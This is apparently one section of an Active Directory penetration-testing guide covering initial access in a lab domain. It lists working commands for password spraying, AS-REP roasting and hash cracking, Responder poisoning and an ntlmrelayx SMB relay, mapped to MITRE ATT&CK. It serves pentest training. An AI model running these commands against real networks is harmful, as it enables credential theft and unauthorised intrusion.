# 🚪 Phase 2: Initial Access

Gaining an initial foothold into the AD environment — typically without having any domain credentials yet.

---

## 2.1 Password Spraying

Password spraying tests **one password against many usernames** — avoids lockout.

```bash
# Using Kerbrute
kerbrute passwordspray --dc 192.168.56.10 -d corp.local users.txt 'Password123!'

# Using CrackMapExec
crackmapexec smb 192.168.56.10 -u users.txt -p 'Password123!' --continue-on-success

# Using Impacket
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.56.10
```

---

## 2.2 AS-REP Roasting

Targets accounts with **"Do not require Kerberos preauthentication"** set.

```bash
# Find and dump AS-REP hashes (no creds needed)
python3 GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -dc-ip 192.168.56.10 -no-pass

# Crack the hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

---

## 2.3 LLMNR/NBT-NS Poisoning (Responder)

```bash
# Start Responder on the network interface
sudo responder -I eth0 -rdw

# Crack captured NTLMv2 hashes
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 2.4 SMB Relay Attack

```bash
# Step 1: Disable SMB and HTTP in Responder.conf
# Step 2: Run Responder
sudo responder -I eth0 -rdw

# Step 3: Run ntlmrelayx
python3 ntlmrelayx.py -tf targets.txt -smb2support
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Brute Force: Password Spraying | T1110.003 | Low-and-slow credential attack |
| Steal or Forge Kerberos Tickets: AS-REP | T1558.004 | No-preauth hash capture |
| LLMNR/NBT-NS Poisoning | T1557.001 | Credential capture via poisoning |
